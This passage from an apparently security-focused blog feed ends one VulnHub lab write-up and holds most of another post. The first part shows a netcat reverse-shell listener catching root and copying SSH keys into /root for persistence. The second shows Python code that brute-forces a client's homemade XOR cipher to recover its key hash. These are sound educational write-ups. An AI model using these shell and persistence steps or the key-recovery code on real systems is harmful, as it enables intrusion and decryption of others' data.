&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# netcat -l -p 4444
bash: cannot set terminal process group (2145): Inappropriate ioctl for device
bash: no job control in this shell
root@bulldog:~# id
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
congrats.txt
cat /root/congrats.txt
Congratulations on completing this VM :D That wasn&amp;#39;t so bad was it?
Let me know what you thought on twitter, I&amp;#39;m @frichette_n
As far as I know there are two ways to get root. Can you find the other one?
Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yeah the other one include reverse engineering which is not my thing :)&lt;/p&gt;
&lt;p&gt;In order to have a complete interactive shell we may just copy our ssh key on the root folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cp /home/django.ssh /root -r
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And connect with ssh:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# ssh 10.0.2.4 -lroot -p23
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)
&amp;amp;lt;SNIP&amp;amp;gt;
root@bulldog:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;DONE.&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://twitter.com/@frichette_n"&gt;@frichette_n&lt;/a&gt; for the machine and thanks to &lt;a href="https://twitter.com/VulnHub"&gt;@vulnub&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="vulnhub"></category><category term="hash"></category></entry><entry><title>Breaking some homemade crypto</title><link href="https://matthieukeller.com/2017/08/breaking-some-homemade-crypto.html" rel="alternate"></link><published>2017-08-01T18:00:00+02:00</published><updated>2017-08-01T18:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2017-08-01:/2017/08/breaking-some-homemade-crypto.html</id><summary type="html">&lt;p&gt;I recently did a code review assessment on an application for one of my client.
The best part of the application was their own cryptography algorithm.&lt;/p&gt;
&lt;p&gt;Moreover, the application was written in PHP and PHP do some strange things with
string, characters and XOR operations.
It only needed a few lines of python in order to break it.&lt;/p&gt;
&lt;p&gt;TL;DR : &lt;strong&gt;please do not write your own crypto!&lt;/strong&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;I recently did a code review assessment on an application for one of my client.
The best part of the application was their own cryptography algorithm.&lt;/p&gt;
&lt;p&gt;Moreover, the application was written in PHP and PHP do some strange things with
string, characters and XOR operations.
It only needed a few lines of python in order to break it.&lt;/p&gt;
&lt;p&gt;TL;DR : &lt;strong&gt;please do not write your own crypto!&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;The cryptography algorithm was a symmetric one, that means there is always a
private key shared between the encryption and the decryption. In fact the
key was shared for the application.&lt;/p&gt;
&lt;h2&gt;Encryption algorithm&lt;/h2&gt;
&lt;p&gt;The encryption algorithm is the following (I rewrote it in python for a better
comprehension):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;privateKey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;key2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privateKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We observe that there is only XOR operations. Quick reminder about XOR
operations:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0 XOR 0 = 0
0 XOR 1 = 1
1 XOR 0 = 1
1 XOR 1 = 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Moreover, by definition: &lt;code&gt;a XOR b XOR a = b&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;Breaking things&lt;/h2&gt;
&lt;p&gt;In our situation we need to find &lt;code&gt;cipherText&lt;/code&gt; in order to find the md5 hash of
the private key. However &lt;code&gt;cipherText&lt;/code&gt; is build using the clear text and a random
number included between 0 and 32 000. Therefore by a
&lt;a href="https://en.wikipedia.org/wiki/Known-plaintext_attack"&gt;Known-plaintext attack&lt;/a&gt;
we can generate the 32 001 values of &lt;code&gt;cipherText&lt;/code&gt;, XOR it with the encrypted
string, search for the resulting sting which will be repeating every 36
characters and get the md5 hash of the private key. Our only constrain in that
the plain text must be longer than 36 characters in order to easily find the md5
hash (an other option might have be to search for ascii characters).&lt;/p&gt;
&lt;p&gt;Here is the python code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def brute():
    clearText=&amp;#39;this is a test in order to break some home made crypto&amp;#39;
    codedText=crypt(clearText)
    k=0
    while (k&amp;amp;lt;32001):
        key= hashlib.md5(str(k).encode(&amp;#39;ascii&amp;#39;)).hexdigest()
        cipherText= &amp;#39;&amp;#39;

        i = 0
        j = 0
        while (i&amp;amp;lt; len(clearText)):
            if (j == len(key)):
                j=0
            cipherText += key[j]+chr(ord(clearText[i])^ord(key[j]))
            i += 1
            j += 1

        i = 0
        j = 0
        result = &amp;#39;&amp;#39;

        while (i&amp;amp;lt; len(codedText)):
            if (j == len(cipherText)):
                j=0
            result += chr(ord(codedText[i]) ^ ord(cipherText[j]))
            i+=1
            j+=1
        l = 0
        s = 0
        while (l&amp;amp;lt;32):
            if (result[l]==result[l+32]):
                s +=1
            l+=1
        if s==32:
            print(k)
            print(result[:32])
            break
        k+=1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I put the two function in a file, added a main and run it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@eridani ~]$ time python crypt.py
23467
e10adc3949ba59abbe56e057f20f883e

real    0m2.186s
user    0m2.186s
sys 0m0.000s
[maggick@eridani ~]$ echo -en &amp;#39;123456&amp;#39; | md5sum
e10adc3949ba59abbe56e057f20f883e  -
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got the md5 hash of the private key. The default key used in the application
was 8 characters long and was use in other algorithms not home made.&lt;/p&gt;
&lt;h2&gt;PHP: character XOR character&lt;/h2&gt;
&lt;p&gt;PHP is doing really funny things, most of you know that.
When analysing the original PHP code of the encryption function, I found
something very strange:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;$tmp .= mb_substr($text, $i, 1) ^ mb_substr($key, $j, 1);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;How can you make a xor operation between two characters?!&lt;/p&gt;
&lt;p&gt;In fact PHP make a xor operation between the ASCII value of the character and
convert the result back to the ASCII character. For instance &lt;code&gt;'a' xor 'B'&lt;/code&gt; will
result in &lt;code&gt;65 xor 98&lt;/code&gt; which give &lt;code&gt;35&lt;/code&gt; therefore &lt;code&gt;'a' xor 'B' â '#'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As you may have seen in the above code this is equivalent to the following
python code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Full code&lt;/h2&gt;
&lt;p&gt;The complete code is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;randint&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;privateKey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;key2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privateKey&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;this is a test in order to break some home made crypto&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;codedText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="mi"&gt;32001&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
            &lt;span class="n"&gt;cipherText&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clearText&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;


        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
